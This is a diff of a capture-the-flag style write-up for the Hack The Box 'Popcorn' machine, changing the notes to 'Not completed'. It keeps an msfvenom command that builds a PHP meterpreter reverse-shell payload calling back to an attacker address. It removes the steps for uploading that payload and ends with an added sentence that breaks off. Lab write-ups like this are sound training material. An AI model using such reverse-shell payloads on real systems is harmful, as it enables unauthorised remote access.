@@ -3,7 +3,7 @@
 <link rel="stylesheet" href="css/retro.css">
 </head>
 
-## HTB-Popcorn (10.10.10.6)
+## HTB-Popcorn (10.10.10.6) - Not completed
 ----
 ### Summary
 ![popcorn](images/popcorn_1.png)
@@ -281,6 +281,4 @@ Let's create a msfvenon php package...
 ```
 msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.24 LPORT=4447 -f raw > poison.php
 ```
-Back to http://10.10.10.6/torrent/torrents.php?mode=upload upload the msfvenom file...
-![http://10.10.10.6/torrent/torrents.php?mode=upload](images/popcorn_8.png)
-
+Some digging around and hints, it looks like I can upload a random torrent file. Once uploaded I can then upload my 
